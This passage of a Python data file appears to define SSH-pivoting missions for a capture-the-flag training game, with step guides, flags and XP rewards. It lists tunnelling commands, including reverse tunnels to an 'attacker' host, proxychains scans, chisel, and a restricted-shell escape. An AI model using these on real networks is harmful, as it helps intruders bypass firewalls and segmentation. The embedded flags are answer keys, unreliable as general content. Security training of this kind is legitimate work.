            {"name": "SSH Local Fwd", "cmd": "ssh -L 8080:internal-host:80 user@target", "desc": "Forward local port to internal"},
            {"name": "SSH Remote Fwd", "cmd": "ssh -R 9090:localhost:22 user@attacker", "desc": "Reverse tunnel back to you"},
        ],
        "step_by_step_guide": (
            "STEP 1: Generate SSH key: ssh-keygen -t rsa -b 4096\n"
            "STEP 2: Copy key to target: ssh-copy-id player@localhost -p 2222\n"
            "STEP 3: Set up local forward: ssh -L 8080:10.10.10.100:80 player@localhost -p 2222\n"
            "STEP 4: Now open browser: http://localhost:8080 — you see the internal web server!\n"
            "STEP 5: The internal web server shows the flag.\n"
            "STEP 6: Submit the flag."
        ),
        "security_level": "None — SSH access with password authentication allowed.",
        "flag": "FLAG{e61bd1e536ac1054}",
        "xp_reward": 100,
    },
    "normal": {
        "briefing": "Password auth is disabled. The internal server is two hops away. Use ProxyJump and dynamic forwarding.",
        "objective": "Chain SSH connections and set up SOCKS proxy for multi-hop access.",
        "methods": ["SSH ProxyJump (-J)", "Dynamic SOCKS proxy (-D)", "SSH config file for persistence"],
        "tools": [
            {"name": "ProxyJump", "cmd": "ssh -J user@jump user@internal", "desc": "Multi-hop SSH"},
            {"name": "SOCKS Proxy", "cmd": "ssh -D 1080 user@target", "desc": "Dynamic SOCKS5 proxy"},
            {"name": "proxychains", "cmd": "proxychains nmap -sT internal-host", "desc": "Route tools through SOCKS"},
        ],
        "step_by_step_guide": (
            "STEP 1: Key-only auth — generate and deploy keys first.\n"
            "STEP 2: Jump through pivot: ssh -J player@hop1 player@internal\n"
            "STEP 3: Or set up SOCKS: ssh -D 1080 player@target\n"
            "STEP 4: Configure proxychains: echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf\n"
            "STEP 5: Use proxychains to scan: proxychains nmap -sT 10.10.10.100\n"
            "STEP 6: Access the hidden service and submit the flag."
        ),
        "security_level": "Key-only authentication. Network segmentation.",
        "defender_config": {"block_duration": 45, "active_signatures": ["password auth"]},
        "flag": "FLAG{8427aeedb2b3494f}",
        "xp_reward": 150,
    },
    "hard": {
        "briefing": "SSH is restricted to specific commands (forced command in authorized_keys). Firewall blocks most ports. Break out and pivot.",
        "objective": "Escape restricted SSH, bypass firewall, and chain multiple tunnels to reach the hidden flag.",
        "methods": ["SSH restricted shell escape", "Reverse tunneling through firewalls", "SSH over HTTP (corkscrew)", "Chisel for SOCKS-over-HTTP"],
        "tools": [
            {"name": "Reverse Tunnel", "cmd": "ssh -R 4444:localhost:22 attacker@your_ip", "desc": "Tunnel back through firewall"},
            {"name": "Chisel", "cmd": "chisel server --reverse --port 8080", "desc": "SOCKS-over-HTTP tunnel"},
            {"name": "sshuttle", "cmd": "sshuttle -r user@target 10.10.10.0/24", "desc": "VPN over SSH"},
        ],
        "step_by_step_guide": (
            "STEP 1: SSH gives you a restricted shell — try to break out.\n"
            "STEP 2: Check: ssh -t user@target /bin/bash (might bypass restriction)\n"
            "STEP 3: If firewalled, use reverse tunnel: ssh -R 4444:internal:80 you@your_ip\n"
            "STEP 4: For HTTP-only egress: use chisel to create SOCKS over HTTP.\n"
            "STEP 5: Chain access to the internal network and find the flag.\n"
            "STEP 6: Submit the flag."
        ),
        "security_level": "Restricted shell, firewall, egress filtering active.",
        "defender_config": {"block_duration": 120, "kill_sessions": True, "patch_vulns": True},
        "flag": "FLAG{68c4929dd63b13ed}",
        "xp_reward": 200,
    },
},
}

# ═══════════════════════════════════════════════════════════════════════════════
#  MERGE EXTENDED MISSIONS (Phase 2-4)
# ═══════════════════════════════════════════════════════════════════════════════
try:
    from core.mission_data_p2 import MISSIONS_P2
    MISSIONS.update(MISSIONS_P2)
except ImportError:
    pass

try:
    from core.mission_data_p3 import MISSIONS_P3
    MISSIONS.update(MISSIONS_P3)
except ImportError:
    pass
